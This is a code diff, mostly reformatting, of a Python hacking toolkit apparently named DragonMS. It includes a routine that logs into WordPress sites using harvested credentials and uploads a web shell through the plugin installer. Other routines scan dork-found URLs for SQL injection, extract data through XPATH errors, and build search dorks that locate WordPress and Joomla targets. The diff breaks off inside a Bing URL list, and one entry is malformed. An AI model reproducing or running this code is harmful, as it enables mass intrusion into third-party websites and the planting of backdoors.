                                                 print(f'{ERRORS} try again.')
                                                 time.sleep(2)
                                                 main_scraper()
                                             ig_downloader(res)
-                                        except KeyboardInterrupt:
-                                            sys.exit(f'{Aborted}')
+                                        except KeyboardInterrupt:sys.exit(f'{Aborted}')
                                     elif x == 5:
                                         clear()
                                         banner_ms()
@@ -785,29 +717,19 @@ def main_tools():
                                                     time.sleep(2)
                                                     main_scraper()
                                                 ghost_follow(res)
-                                            except Exception as e:
-                                                sys.exit(f'{ERROR_SYM} {e}')
-                                        except KeyboardInterrupt:
-                                            sys.exit(f'{Aborted}')
-                                except KeyboardInterrupt:
-                                    sys.exit(f'{Aborted}')
-                                except ValueError:
-                                    sys.exit(f'{NFound}')
+                                            except Exception as e:sys.exit(f'{ERROR_SYM} {e}')
+                                        except KeyboardInterrupt:sys.exit(f'{Aborted}')
+                                except KeyboardInterrupt:sys.exit(f'{Aborted}')
+                                except ValueError:sys.exit(f'{NFound}')
                             main_scraper()
-                        
                     elif x == 2:
-
                         def get_followings(username):
-
                             c = twint.Config()
                             c.Username = username
                             c.Pandas = True
-
                             twint.run.Following(c)
                             list_of_followings = twint.storage.panda.Follow_df
-
                             return list_of_followings['following'][username]
-
                         def stat(named):
                             clear()
                             banner_ms()
@@ -817,14 +739,9 @@ def main_tools():
                                 following_list = []
                                 for person in users:
                                     print(f'{PULS} Starting : {person}')
-                                    try:
-                                        followings[person] = get_followings(person)
-                                        following_list = following_list + followings[person]
-                                    except KeyError:
-                                        print(f'{ERRORS} IndexError')
-
+                                    try:followings[person], following_list = get_followings(person), following_list + followings[person]
+                                    except KeyError:print(f'{ERRORS} IndexError')
                                 Counter(following_list).most_common(10)
-
                                 follow_relations ={}
                                 for following_user in followings.keys():
                                     follow_relation_list = []
@@ -837,18 +754,13 @@ def main_tools():
 
                                 following_df = pd.DataFrame.from_dict(follow_relations,orient='index', columns=followings.keys())
                                 following_df
-                            except KeyboardInterrupt:
-
-                                sys.exit(Aborted)
+                            except KeyboardInterrupt:sys.exit(Aborted)
 
                         try:
                             names = input_drg(f'{PULS} Username: ')
                             if names == '':sys.exit(f'{ERRORS}')
                             stat(names)
-
-
-                        except:
-                            pass
+                        except:pass
                     elif x == 3:
                         clear()
                         banner_ms()
@@ -867,51 +779,30 @@ def main_tools():
                                     with open(f'{NAME_PATH}', 'w') as wrt:
                                         wrt.write(RES)
                                         print(f'{SUCES_SYM} Wikipedia Logs saved at [{NAME_PATH}]')
-                                except:
-                                    sys.exit(f"{ERRORS}")
-                            except ValueError:
-                                sys.exit(f'{ERRORS}')
-                        except KeyboardInterrupt:
-                            sys.exit(Aborted)
+                                except:sys.exit(f"{ERRORS}")
+                            except ValueError:sys.exit(f'{ERRORS}')
+                        except KeyboardInterrupt:sys.exit(Aborted)
                     elif x == 4:
                         try:
-                                urls = input_drg(f'{PULS} Youtube Link: ')
-                                if 'https://www.youtube.com/' not in urls:
-                                    sys.exit(f'{ERROR_SYM} Try again.')
-                                    time.sleep(1)
-                                    clear()
-                                    banner_ms()
-                                else:
-                                    yt_logs = YouTube(urls)
-                                    print(f"""
-    ===========| YOUTUBE INFO |===========
-        [+] Title       : {yt_logs.title}
-        [+] Views       : {yt_logs.views}
-        [+] Duration    : {yt_logs.length}
-        [+] Description : {yt_logs.description}
-        [+] Ratings     : {yt_logs.rating}
-    ======================================""")
-                                    stream = yt_logs.streams.get_highest_resolution()
-                                    stream.download()
-                                    print(f"{PULS} Download completed!!")
-                        except ValueError:
-                            sys.exit(f"{ERRORS}")
-                    else:
-                        raise ValueError(NFound)
-
-                except ValueError:
-                    sys.exit(NFound)
-                except KeyboardInterrupt:
-                    sys.exit(Aborted)
-            elif (x == 5):print('[-] Cooming Soon.')
-            elif (x == 6):main_tools()
+                            urls = input_drg(f'{PULS} Youtube Link: ')
+                            if 'https://www.youtube.com/' not in urls:
+                                sys.exit(f'{ERROR_SYM} Try again.')
+                                time.sleep(1)
+                                clear()
+                                banner_ms()
+                            else:
+                                yt_logs = YouTube(urls)
+                                print(f"""\n {fb}[+] Title       : {sb}{fr}{yt_logs.title}\n {fb}[+] Views       : {sb}{fr}{yt_logs.views}\n {fb}[+] Duration    : {sb}{fr}{yt_logs.length}\n {fb}[+] Description : {sb}{fr}{yt_logs.description}\n {fb}[+] Ratings     : {sb}{fr}{yt_logs.rating}""")
+                                stream = yt_logs.streams.get_highest_resolution()
+                                stream.download()
+                                print(f"{PULS} Download completed!!")
+                        except ValueError:sys.exit(f"{ERRORS}")
+                    else:raise ValueError(NFound)
+                except ValueError:sys.exit(NFound)
+                except KeyboardInterrupt:sys.exit(Aborted)
             elif (x == 0):os.system('python3 main.py')
-            else:
-                sys.exit(NFound)
-
-    except KeyboardInterrupt:
-        sys.exit(Aborted)
-
+            else:sys.exit(NFound)
+    except KeyboardInterrupt:sys.exit(Aborted)
 def wpup_shell():
     clear()
     banner_ms()
@@ -940,22 +831,21 @@ def wpup_shell():
                             domain = 'http'+dataLogin[0][0]
                             user = dataLogin[0][1]
                             password = dataLogin[0][2]
-                            print("{}{} [*] Site : ".format(fc, sb)+domain+"/")
-                            print(" [*] Username : ".format(fy, sb)+user)
-                            print(" [*] Password : ".format(fm, sb)+password)
+                            print("{} [*] Site :{}{} ".format(fb, fg,sb)+domain)
+                            print("{} [*] Username :{}{} ".format(fb, fg,sb)+user)
+                            print("{} [*] Password :{}{} ".format(fb, fg,sb)+password)
                             pattern = re.compile('<input_drg type="hidden" id="_wpnonce" name="_wpnonce" value="(.*)" /><input_drg type="hidden" name="_wp_http_referer"')
                             post = {'log':user,'pwd':password,'wp-submit':'Log In','redirect_to':domain+'/wp-admin/','testcookie':'1' }
-                            try :
-                                login = req.post(domain+'/wp-login.php',data=post,timeout=30)
+                            try:login = req.post(domain+'/wp-login.php',data=post,timeout=30)
                             except :
-                                print(' [-]'+'{} Time Out \n'.format(fr))
+                                print('{} [-] Time Out \n'.format(fr))
                                 invalid = open('invalid.txt','a')
                                 invalid.write(site+"\n")
-                                invalid.close()                         
+                                invalid.close()
                                 continue
                             check = req.get(domain+'/wp-admin',timeout=60)
                             if 'profile.php' in check.content :
-                                print(' [+]'+"{} Successful login".format(fg))
+                                print("{} [+] Successful login".format(fg))
                                 plugin_install_php = req.get(domain+'/wp-admin/plugin-install.php?tab=upload',timeout=60)
                                 if re.findall(pattern,plugin_install_php.content) :
                                     id = re.findall(pattern,plugin_install_php.content)
@@ -964,10 +854,8 @@ def wpup_shell():
                                     shellname = open(file,'rb')
                                     filename = file
                                     filedata = {'_wpnonce':id,'_wp_http_referer':'/wp-admin/plugin-install.php','install-plugin-submit':'Install Now'}
-                                    if '.zip' in file :
-                                        fileup = {'pluginzip':(filename,shellname,'multipart/form-data')}
-                                    else :
-                                        fileup = {'pluginzip':(filename,shellname)}
+                                    if '.zip' in file :fileup = {'pluginzip':(filename,shellname,'multipart/form-data')}
+                                    else :fileup = {'pluginzip':(filename,shellname)}
                                     Cherryreq = req.post(update_php, data=filedata, files=fileup,timeout=60)
                                     if '.zip' in file :
                                         shell = domain+'/wp-content/plugins/'+pluginname+'/'+shellnamezip
@@ -978,40 +866,36 @@ def wpup_shell():
                                             shellsFile.write(shell+"\n")
                                             shellsFile.close()
                                         else :
-                                            print(" [-]"+"{} Failed upload\n".format(fr))
+                                            print("{} [-] Failed upload\n".format(fr))
                                             upUP = open('unUP.txt','a')
                                             upUP.write(site+"\n")
                                             upUP.close()
                                 else :
-                                    print(" [-]"+"{} Upload page not Working\n".format(fr))
+                                    print("{} [-] Upload page not Working\n".format(fr))
                                     upUP = open('unUP.txt','a')
                                     upUP.write(site+"\n")
                                     upUP.close()
                             else :
-                                print(' [-]'+'{} Failed login \n'.format(fr))
+                                print('{} [-] Failed login \n'.format(fr))
                                 invalid = open('invalid.txt','a')
                                 invalid.write(site+"\n")
-                                invalid.close()                 
-                        else :
-                            print("  Error in list !\n  Must be : http://domain.com/wp-login.php#username@password")
+                                invalid.close()
+                        else:print("{}  Error in list !\n  Must be : http://domain.com/wp-login.php#username@password".format(fr))
                     except :
                         site = site.strip()
                         print(' [-]'+'{} Time Out \n'.format(fr))
                         invalid = open('invalid.txt','a')
                         invalid.write(site+"\n")
-                        invalid.close()                         
+                        invalid.close()
                         continue
             else :
                 print(fr+" [!] File does not exist !")
                 sys.exit(0)
     else:
-        print(fr+"  "+sites_file+ "  does not exist !")
+        print(fg+" "+sites_file+fr+ "  does not exist !")
         sys.exit(0)
-
 def some_tools():
-
     try:
-
         clear()
         banner_ms()
         small_tools()
@@ -1019,19 +903,14 @@ def some_tools():
         if x == 1:
             z = input_drg(' [+] Url : ')
             def make_tiny(z):
-                request_url = ('http://tinyurl.com/api-create.php?' +
-                urlencode({'url':z}))
-                with contextlib.closing(urlopen(request_url)) as response:
-                    return response.read().decode('utf-8')
-
-            for tinyurl in map(make_tiny, z):
-                print(f'{PULS} Done: '+tinyurl)
+                request_url = ('http://tinyurl.com/api-create.php?'+urlencode({'url':z}))
+                with contextlib.closing(urlopen(request_url)) as response:return response.read().decode('utf-8')
+            for tinyurl in map(make_tiny, z):print(f'{PULS} Done: '+tinyurl)
         elif x == 2:
             clear()
             banner_ms()
             MAX_NONCE = 100000000000
-            def SHA256(text):
-                return sha256(text.encode("ascii")).hexdigest()
+            def SHA256(text):return sha256(text.encode("ascii")).hexdigest()
             def mine(block_number, transactions, previous_hash, prefix_zeros):
                 prefix_str = '0'*prefix_zeros
                 for nonce in range(MAX_NONCE):
@@ -1047,30 +926,22 @@ def some_tools():
             print(" --> Mining Started.")
             new_hash = mine(5,transactions,'0000000xa036944e29568d0cff17edbe038f81208fecf9a66be9a2b8321c6ec7', difficulty)
             total_time = str((time.time() - start))
-            print(" [+] Total Time  : {} seconds".format(total_time))
-            print(' [+] Transactions: {}'.format(new_hash))
+            print("{} [+] Total Time  : {}{} seconds".format(fb,fg,total_time))
+            print('{} [+] Transactions: {}{}'.format(fb,fg,new_hash))
             NAME_PATH = 'result/bit_mining.txt'
-            with open(f'{NAME_PATH}', 'w') as wr:
-                wr.write(new_hash)
-
+            with open(f'{NAME_PATH}', 'w') as wr:wr.write(new_hash)
         elif x == 3:pass
         elif (x == 0):os.system('python3 main.py')
         else:sys.exit(NFound)
-
-    except KeyboardInterrupt:
-        sys.exit(Aborted)
-
+    except KeyboardInterrupt:sys.exit(Aborted)
 def random_dork():
     dork_path = "dork.txt"
     dork_file = open(dork_path, "r")
     line = next(dork_file)
-    
     for num, dorkLine in enumerate(dork_file):
         if random.randrange(num + 2): continue
         line = dorkLine
-    
     return line
-
 def check_url(url):
     try:
         hdr = {
@@ -1081,7 +952,7 @@ def check_url(url):
            'Accept-Language': 'en-US,en;q=0.8',
            'Connection': 'keep-alive'
         }
-        
+
         url_fixed = url + '\''
         http = urllib3.PoolManager()
         request = http.request('GET', url_fixed, headers=hdr)
@@ -1090,20 +961,6 @@ def check_url(url):
         if find_error:return str("true")
     except:
         googleScanner()
-'''
-class TooManyRequests(Exception):
-    """Too many requests"""
-
-@task(
-   rate_limit='10/s',
-   autoretry_for=(ConnectTimeout, TooManyRequests,),
-   retry_backoff=True)
-def api(*args, **kwargs):
-  r = requests.get('placeholder-external-api')
-
-  if r.status_code == 429:
-    raise TooManyRequests()
-'''
 def googleScanner():
     clear()
     banner_ms()
@@ -1119,20 +976,13 @@ def googleScanner():
             try:
                 isVul = check_url(url)
                 if isVul == 'true':vulSites.append(url)
-            except urllib3.exceptions.MaxRetryError:
-                continue
-    except urllib3.exceptions.HTTPError:
-        exit('[503] Service Unreachable')
-    except urllib.error.HTTPError:
-        print("HTTP Error please try later or use tor, proxy, vpn.")
-        pass
-        
+            except urllib3.exceptions.MaxRetryError:continue
+    except urllib3.exceptions.HTTPError:exit('{} [503] Service Unreachable'.format(fr))
+    except urllib.error.HTTPError:print("{} HTTP Error please try later or use tor, proxy, vpn.".format(fr))
     else:
-        for vulnerable in vulSites:
-            pass
+        for vulnerable in vulSites:pass
         if len(vulSites) == 0:return False
         save_sites(vulSites)
-
 def googleScraper(dork):
     clear()
     banner_ms()
@@ -1143,9 +993,9 @@ def googleScraper(dork):
         try:
             r   = requests.get( url, params = payload )
             if 'XPATH syntax error' in r.text:return url + ':' + re.search( "XPATH syntax error: ':(.+?)'", r.text ).group(1)
-            else:return url + ':' + 'Not Vulnerable'
+            else:return url + ':' + fr+'Not Vulnerable'
         except:
-            return url + ':' + 'Bad Response'
+            return url + ':' + fr+'Bad Response'
 
 
     start         = timer()
@@ -1153,23 +1003,18 @@ def googleScraper(dork):
     file_string   = '######## DragonMS ########\n'
     final_result  = []
     count         = 0
-    with Pool(8) as p:
-        final_result.extend( p.map( inject, search_result ) )
+    with Pool(8) as p:final_result.extend( p.map( inject, search_result ) )
     for i in final_result:
         if not 'Not Vulnerable' in i and not 'Bad Response' in i:
             count += 1
-            print ( '------------------------------------------------\n')
-            print ( 'Url     : http:' + i.split(':')[1]                 )
-            print ( 'User    : '      + i.split(':')[2]                 )
-            print ( 'Version : '      + i.split(':')[3]                 )
-            print ( '------------------------------------------------\n')
+            print(fb+'[+] Url     : '+fg+'http:' + i.split(':')[1])
+            print(fb+'[+] User    : '+fg+i.split(':')[2])
+            print(fb+'[+] Version : '+fg+i.split(':')[3])
             file_string = file_string + 'http:' + i.split(':')[1] + '\n' + i.split(':')[2] + '\n' + i.split(':')[3] + '\n\n\n'
-    with open( 'result/googleScraper.txt', 'a', encoding = 'utf-8' ) as file:
-        file.write( file_string )
-    print( 'Total URLs Scanned    : %s' % len( search_result ) )
-    print( 'Vulnerable URLs Found : %s' % count )
-    print( 'Script Execution Time : %s' % ( timer() - start, ) )
-
+    with open('result/googleScraper.txt', 'a', encoding = 'utf-8' ) as file:file.write( file_string )
+    print(fb+'Total URLs Scanned    : %s%s' % fg,len( search_result ) )
+    print(fb+'Vulnerable URLs Found : %s%s' % fg,count )
+    print(fb+'Script Execution Time : %s%s' % fg,( timer() - start, ) )
 def dork_maker():
     clear()
     banner_ms()
@@ -1186,41 +1031,25 @@ def dork_maker():
     cms = int(input("\n [+] Which dorks: "))
     if cms == 1:
         print(" %s[+] Prepared dorks:"%fb + "\n")
-        wpdorks = {'("Comment on Hello world!")',
-                   '("Comentarios en Hello world!")',
-                   '("author/admin")',
-                   '("uncategorized/hello-world")',
-                   '("category/sin-categoria")',
-                   '("uncategorized")',
-                   '("Proudly powered by WordPress")',
-                   '("Welcome to WordPress. This is your first post.")',
-                   '("Just another WordPress site")',
-                   '("Mr WordPress on Hello world!")',
-                   '("/wp/hello-world/")'}
+        wpdorks = {'("Comment on Hello world!")','("Comentarios en Hello world!")','("author/admin")','("uncategorized/hello-world")','("category/sin-categoria")','("uncategorized")','("Proudly powered by WordPress")','("Welcome to WordPress. This is your first post.")','("Just another WordPress site")','("Mr WordPress on Hello world!")','("/wp/hello-world/")'}
         for wpdork in wpdorks:
             for word in words:
                 print(wpdork + word)
                 try:
-                    with open("dorkstest.txt","a") as f:
-                        f.write(wpdork + word + "\n")
-                except:
-                    pass
+                    with open("dorkstest.txt","a") as f:f.write(wpdork + word + "\n")
+                except:pass
         input("\n %s[*] Please enter to remove duplicate dorks..."%fr)
         clean()
 
     elif cms == 2:
         print(" %s[+] Prepared dorks:"%fb + "\n")
-        jmdorks = {'index.php?option=com_users ',
-                   'index.php?option=com_jce ',
-                   '("com_user")'}
+        jmdorks = {'index.php?option=com_users ','index.php?option=com_jce ','("com_user")'}
         for jmdork in jmdorks:
             for word in words:
                 print(jmdork + word)
                 try:
-                    with open("dorkstest.txt","a") as f:
-                        f.write(jmdork + word + "\n")
-                except:
-                    pass
+                    with open("dorkstest.txt","a") as f:f.write(jmdork + word + "\n")
+                except:pass
         input("\n %s[+] Please enter to remove duplicate dorks..."%fr)
         clean()
 
@@ -1232,187 +1061,14 @@ def dork_maker():
             for word in words:
                 print(ocdork + word)
                 try:
-                    with open("dorkstest.txt","a") as f:
-                        f.write(ocdork + word + "\n")
-                except:
-                    pass
+                    with open("dorkstest.txt","a") as f:f.write(ocdork + word + "\n")
+                except:pass
         input("\n %s[*] Please hit enter to remove duplicate dorks..."%fr)
         clean()
-
-    else:
-        print("%s [-] Invalid Optionn! Tool closed!"%fr)
-
+    else:print("%s [-] Invalid Optionn! Tool closed!"%fr)
 def dork_scan():
     clean('sites')
-    binglist = {"http://www.bing.com/search?q=&count=50&first=1",
-    "http://www.bing.com/search?q=&count=50&first=51",
-    "http://www.bing.com/search?q=&count=50&first=101",
-    "http://www.bing.com/search?q=&count=50&first=151",
-    "http://www.bing.com/search?q=&count=50&first=201",
-    "http://www.bing.com.br/search?q=&count=50&first=1",
-    "http://www.bing.com.br/search?q=&count=50&first=51",
-    "http://www.bing.com.br/search?q=&count=50&first=101",
-    "http://www.bing.at/search?q=&count=50&first=1",
-    "http://www.bing.at/search?q=&count=50&first=51",
-    "http://www.bing.at/search?q=&count=50&first=101",
-    "http://www.bing.be/search?q=&count=50&first=1",
-    "http://www.bing.be/search?q=&count=50&first=51",
-    "http://www.bing.be/search?q=&count=50&first=101",
-    "http://www.bing.cl/search?q=&count=50&first=1",
-    "http://www.bing.cl/search?q=&count=50&first=51",
-    "http://www.bing.cl/search?q=&count=50&first=101",
-    "http://www.bing.co.at/search?q=&count=50&first=1",
-    "http://www.bing.co.at/search?q=&count=50&first=51",
-    "http://www.bing.co.at/search?q=&count=50&first=101",
-    "http://www.bing.com.au/search?q=&count=50&first=1",
-    "http://www.bing.com.au/search?q=&count=50&first=51",
-    "http://www.bing.com.au/search?q=&count=50&first=101",
-    "http://www.bing.com.cn/search?q=&count=50&first=1",
-    "http://www.bing.com.cn/search?q=&count=50&first=51",
-    "http://www.bing.com.cn/search?q=&count=50&first=101",
-    "http://www.bing.cz/search?q=&count=50&first=1",
-    "http://www.bing.cz/search?q=&count=50&first=51",
-    "http://www.bing.cz/search?q=&count=50&first=101",
-    "http://www.bing.de/search?q=&count=50&first=1",
-    "http://www.bing.de/search?q=&count=50&first=51",
-    "http://www.bing.de/search?q=&count=50&first=101",
-    "http://www.bing.dk/search?q=&count=50&first=1",
-    "http://www.bing.dk/search?q=&count=50&first=51",
-    "http://www.bing.dk/search?q=&count=50&first=101",
-    "http://www.bing.ca/search?q=&count=50&first=1",
-    "http://www.bing.ca/search?q=&count=50&first=51",
-    "http://www.bing.ca/search?q=&count=50&first=101",
-    "http://www.bing.sg/search?q=&count=50&first=1",
-    "http://www.bing.sg/search?q=&count=50&first=51",
-    "http://www.bing.sg/search?q=&count=50&first=101",
-    "http://www.bing.se/search?q=&count=50&first=1",
-    "http://www.bing.se/search?q=&count=50&first=51",
-    "http://www.bing.se/search?q=&count=50&first=101",
-    "http://www.bing.pl/search?q=&count=50&first=1",
-    "http://www.bing.pl/search?q=&count=50&first=51",
-    "http://www.bing.pl/search?q=&count=50&first=101",
-    "http://www.bing.no/search?q=&count=50&first=1",
-    "http://www.bing.no/search?q=&count=50&first=51",
-    "http://www.bing.no/search?q=&count=50&first=101",
-    "http://www.bing.nl/search?q=&count=50&first=1",
-    "http://www.bing.nl/search?q=&count=50&first=51",
-    "http://www.bing.nl/search?q=&count=50&first=101",
-    "http://www.bing.net.nz/search?q=&count=50&first=1",
-    "http://www.bing.net.nz/search?q=&count=50&first=51",
-    "http://www.bing.net.nz/search?q=&count=50&first=101",
-    "http://www.bing.lv/search?q=&count=50&first=1",
-    "http://www.bing.lv/search?q=&count=50&first=51",
-    "http://www.bing.lv/search?q=&count=50&first=101",
-    "http://www.bing.lt/search?q=&count=50&first=1",
-    "http://www.bing.lt/search?q=&count=50&first=51",
-    "http://www.bing.lt/search?q=&count=50&first=101",
-    "http://www.bing.it/search?q=&count=50&first=1",
-    "http://www.bing.it/search?q=&count=50&first=51",
-    "http://www.bing.it/search?q=&count=50&first=101",
-    "http://www.bing.is/search?q=&count=50&first=1",
-    "http://www.bing.is/search?q=&count=50&first=51",
-    "http://www.bing.is/search?q=&count=50&first=101",
-    "http://www.bing.in/search?q=&count=50&first=1",
-    "http://www.bing.in/search?q=&count=50&first=51",
-    "http://www.bing.in/search?q=&count=50&first=101",
-    "http://www.bing.ie/search?q=&count=50&first=1",
-    "http://www.bing.ie/search?q=&count=50&first=51",
-    "http://www.bing.ie/search?q=&count=50&first=101",
-    "http://www.bing.hu/search?q=&count=50&first=1",
-    "http://www.bing.hu/search?q=&count=50&first=51",
-    "http://www.bing.hu/search?q=&count=50&first=101",
-    "http://www.bing.fr/search?q=&count=50&first=1",
-    "http://www.bing.fr/search?q=&count=50&first=51",
-    "http://www.bing.fr/search?q=&count=50&first=101",
-    "http://www.bing.com.sg/search?q=&count=50&first=1",
-    "http://www.bing.com.sg/search?q=&count=50&first=51",
-    "http://www.bing.com.sg/search?q=&count=50&first=101",
-    "http://www.bing.co.uk/search?q=&count=50&first=1",
-    "http://www.bing.co.uk/search?q=&count=50&first=51",
-    "http://www.bing.co.uk/search?q=&count=50&first=101",
-    "http://www.bing.co.nz/search?q=&count=50&first=1",
-    "http://www.bing.co.nz/search?q=&count=50&first=51",
-    "http://www.bing.co.nz/search?q=&count=50&first=101",
-    "http://www.bing.co.jp/search?q=&count=50&first=1",
-    "http://www.bing.co.jp/search?q=&count=50&first=51",
-    "http://www.bing.co.jp/search?q=&count=50&first=101",
-    "http://www.bing.ch/search?q=&count=50&first=1",
-    "http://www.bing.ch/search?q=&count=50&first=51",
-    "http://www.bing.ch/search?q=&count=50&first=101",
-    "http://www.bing.com.tr/search?q=&count=50&first=1",
-    "http://www.bing.com.tr/search?q=&count=50&first=51",
-    "http://www.bing.com.tr/search?q=&count=50&first=101",
-    "http://www.bing.com.pr/search?q=&count=50&first=1",
-    "http://www.bing.com.pr/search?q=&count=50&first=51",
-    "http://www.bing.com.pr/search?q=&count=50&first=101",
-    "http://www.bing.com.ar/search?q=&count=50&first=1",
-    "http://www.bing.com.ar/search?q=&count=50&first=51",
-    "http://www.bing.com.ar/search?q=&count=50&first=101",
-    "http://www.bing.com.co/search?q=&count=50&first=1",
-    "http://www.bing.com.co/search?q=&count=50&first=51",
-    "http://www.bing.com.co/search?q=&count=50&first=101",
-    "http://www.bing.com.es/search?q=&count=50&first=1",
-    "http://www.bing.com.es/search?q=&count=50&first=51",
-    "http://www.bing.com.es/search?q=&count=50&first=101",
-    "http://www.bing.fi/search?q=&count=50&first=1",
-    "http://www.bing.fi/search?q=&count=50&first=51",
-    "http://www.bing.fi/search?q=&count=50&first=101",
-    "http://www.bing.bo/search?q=&count=50&first=1",
-    "http://www.bing.bo/search?q=&count=50&first=51",
-    "http://www.bing.bo/search?q=&count=50&first=101",
-    "http://www.bing.com.do/search?q=&count=50&first=1",
-    "http://www.bing.com.do/search?q=&count=50&first=51",
-    "http://www.bing.com.do/search?q=&count=50&first=101",
-    "http://www.bing.gr/search?q=&count=50&first=1",
-    "http://www.bing.gr/search?q=&count=50&first=51",
-    "http://www.bing.gr/search?q=&count=50&first=101",
-    "http://www.bing.com.hk/search?q=&count=50&first=1",
-    "http://www.bing.com.hk/search?q=&count=50&first=51",
-    "http://www.bing.com.hk/search?q=&count=50&first=101",
-    "http://www.bing.com.hr/search?q=&count=50&first=1",
-    "http://www.bing.com.hr/search?q=&count=50&first=51",
-    "http://www.bing.com.hr/search?q=&count=50&first=101",
-    "http://www.bing.com.mx/search?q=&count=50&first=1",
-    "http://www.bing.com.mx/search?q=&count=50&first=51",
-    "http://www.bing.com.mx/search?q=&count=50&first=101",
-    "http://www.bing.com.my/search?q=&count=50&first=1",
-    "http://www.bing.com.my/search?q=&count=50&first=51",
-    "http://www.bing.com.my/search?q=&count=50&first=101",
-    "http://www.bing.ph/search?q=&count=50&first=1",
-    "http://www.bing.ph/search?q=&count=50&first=51",
-    "http://www.bing.ph/search?q=&count=50&first=101",
-    "http://www.bing.com.pr/search?q=&count=50&first=1",
-    "http://www.bing.com.pr/search?q=&count=50&first=51",
-    "http://www.bing.com.pr/search?q=&count=50&first=101",
-    "http://www.bing.pt/search?q=&count=50&first=1",
-    "http://www.bing.pt/search?q=&count=50&first=51",
-    "http://www.bing.pt/search?q=&count=50&first=101",
-    "http://www.bing.com.ro/search?q=&count=50&first=1",
-    "http://www.bing.com.ro/search?q=&count=50&first=51",
-    "http://www.bing.com.ro/search?q=&count=50&first=101",
-    "http://www.bing.ru/search?q=&count=50&first=1",
-    "http://www.bing.ru/search?q=&count=50&first=51",
-    "http://www.bing.ru/search?q=&count=50&first=101",
-    "http://www.bing.com.sa/search?q=&count=50&first=1",
-    "http://www.bing.com.sa/search?q=&count=50&first=51",
-    "http://www.bing.com.sa/search?q=&count=50&first=101",
-    "http://www.bing.si/search?q=&count=50&first=1",
-    "http://www.bing.si/search?q=&count=50&first=51",
-    "http://www.bing.si/search?q=&count=50&first=101",
-    "http://www.bing.sk/search?q=&count=50&first=1",
-    "http://www.bing.sk/search?q=&count=50&first=51",
-    "http://www.bing.sk/search?q=&count=50&first=101",
-    "http://www.bing.com.ua/search?q=&count=50&first=1",
-    "http://www.bing.com.ua/search?q=&count=50&first=51",
-    "http://www.bing.com.ua/search?q=&count=50&first=101",
-    "http://www.bing.com.uy/search?q=&count=50&first=1",
-    "http://www.bing.com.uy/search?q=&count=50&first=51",
-    "http://www.bing.com.uy/search?q=&count=50&first=101",
-    "http://www.bing.vn/search?q=&count=50&first=1",
-    "http://www.bing.vn/search?q=&count=50&first=51",
-    "http://www.bing.vn/search?q=&count=50&first=101"}
-
-
+    binglist = {"http://www.bing.com/search?q=&count=50&first=1","http://www.bing.com/search?q=&count=50&first=51","http://www.bing.com/search?q=&count=50&first=101","http://www.bing.com/search?q=&count=50&first=151","http://www.bing.com/search?q=&count=50&first=201","http://www.bing.com.br/search?q=&count=50&first=1","http://www.bing.com.br/search?q=&count=50&first=51","http://www.bing.com.br/search?q=&count=50&first=101","http://www.bing.at/search?q=&count=50&first=1","http://www.bing.at/search?q=&count=50&first=51","http://www.bing.at/search?q=&count=50&first=101","http://www.bing.be/search?q=&count=50&first=1","http://www.bing.be/search?q=&count=50&first=51","http://www.bing.be/search?q=&count=50&first=101","http://www.bing.cl/search?q=&count=50&first=1","http://www.bing.cl/search?q=&count=50&first=51","http://www.bing.cl/search?q=&count=50&first=101","http://www.bing.co.at/search?q=&count=50&first=1","http://www.bing.co.at/search?q=&count=50&first=51","http://www.bing.co.at/search?q=&count=50&first=101","http://www.bing.com.au/search?q=&count=50&first=1","http://www.bing.com.au/search?q=&count=50&first=51","http://www.bing.com.au/search?q=&count=50&first=101","http://www.bing.com.cn/search?q=&count=50&first=1","http://www.bing.com.cn/search?q=&count=50&first=51","http://www.bing.com.cn/search?q=&count=50&first=101","http://www.bing.cz/search?q=&count=50&first=1","http://www.bing.cz/search?q=&count=50&first=51","http://www.bing.cz/search?q=&count=50&first=101","http://www.bing.de/search?q=&count=50&first=1","http://www.bing.de/search?q=&count=50&first=51","http://www.bing.de/search?q=&count=50&first=101","http://www.bing.dk/search?q=&count=50&first=1","http://www.bing.dk/search?q=&count=50&first=51","http://www.bing.dk/search?q=&count=50&first=101","http://www.bing.ca/search?q=&count=50&first=1","http://www.bing.ca/search?q=&count=50&first=51","http://www.bing.ca/search?q=&count=50&first=101","http://www.bing.sg/search?q=&count=50&first=1","http://www.bing.sg/search?q=&count=50&first=51","http://www.bing.sg/search?q=&count=50&first=101","http://www.bing.se/search?q=&count=50&first=1","http://www.bing.se/search?q=&count=50&first=51","http://www.bing.se/search?q=&count=50&first=101","http://www.bing.pl/search?q=&count=50&first=1","http://www.bing.pl/search?q=&count=50&first=51","http://www.bing.pl/search?q=&count=50&first=101","http://www.bing.no/search?q=&count=50&first=1","http://www.bing.no/search?q=&count=50&first=51","http://www.bing.no/search?q=&count=50&first=101","http://www.bing.nl/search?q=&count=50&first=1","http://www.bing.nl/search?q=&count=50&first=51","http://www.bing.nl/search?q=&count=50&first=101","http://www.bing.net.nz/search?q=&count=50&first=1","http://www.bing.net.nz/search?q=&count=50&first=51","http://www.bing.net.nz/search?q=&count=50&first=101","http://www.bing.lv/search?q=&count=50&firsthttp://www.bing.lv/search?q=&count=50&first=51","http://www.bing.lv/search?q=&count=50&first=101","http://www.bing.lt/search?q=&count=50&first=1","http://www.bing.lt/search?q=&count=50&first=51","http://www.bing.lt/search?q=&count=50&first=101","http://www.bing.it/search?q=&count=50&first=1","http://www.bing.it/search?q=&count=50&first=51","http://www.bing.it/search?q=&count=50&first=101","http://www.bing.is/search?q=&count=50&first=1","http://www.bing.is/search?q=&count=50&first=51","http://www.bing.is/search?q=&count=50&first=101","http://www.bing.in/search?q=&count=50&first=1","http://www.bing.in/search?q=&count=50&first=51","http://www.bing.in/search?q=&count=50&first=101","http://www.bing.ie/search?q=&count=50&first=1","http://www.bing.ie/search?q=&count=50&first=51","http://www.bing.ie/search?q=&count=50&first=101","http://www.bing.hu/search?q=&count=50&first=1","http://www.bing.hu/search?q=&count=50&first=51","http://www.bing.hu/search?q=&count=50&first=101","http://www.bing.fr/search?q=&count=50&first=1","http://www.bing.fr/search?q=&count=50&first=51","http://www.bing.fr/search?q=&count=50&first=101","http://www.bing.com.sg/search?q=&count=50&first=1","http://www.bing.com.sg/search?q=&count=50&first=51","http://www.bing.com.sg/search?q=&count=50&first=101","http://www.bing.co.uk/search?q=&count=50&first=1","http://www.bing.co.uk/search?q=&count=50&first=51","http://www.bing.co.uk/search?q=&count=50&first=101","http://www.bing.co.nz/search?q=&count=50&first=1","http://www.bing.co.nz/search?q=&count=50&first=51","http://www.bing.co.nz/search?q=&count=50&first=101","http://www.bing.co.jp/search?q=&count=50&first=1","http://www.bing.co.jp/search?q=&count=50&first=51","http://www.bing.co.jp/search?q=&count=50&first=101","http://www.bing.ch/search?q=&count=50&first